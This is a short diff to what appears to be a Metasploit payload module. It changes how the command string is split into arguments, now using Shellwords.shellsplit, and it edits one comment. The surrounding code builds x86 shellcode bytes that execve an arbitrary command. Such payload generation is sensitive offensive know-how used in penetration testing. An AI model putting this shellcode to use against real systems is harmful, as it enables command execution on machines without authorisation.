@@ -48,7 +48,7 @@ module Metasploit3
 	def generate_stage
 		cmd_str   = datastore['CMD'] || ''
 		# Split the cmd string into arg chunks
-		cmd_parts = cmd_str.split(/[\s]+/)
+		cmd_parts = Shellwords.shellsplit(cmd_str)
 		# the non-exe-path parts of the chunks need to be reversed for execve
 		cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
 		arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
@@ -61,7 +61,7 @@ module Metasploit3
 
 		# now EBX contains &cmd_parts[0], the exe path
 		if cmd_parts.length > 1
-			# Build an array of pointers to the arguments we copied on to the stack
+			# Build an array of pointers to arguments
 			payload += "\x89\xD9" +                   # mov ecx, ebx
 			           "\x50" +                       # push eax; null byte (end of array)
 			           "\x89\xe2"                     # mov edx, esp (EDX points to the end-of-array null byte)
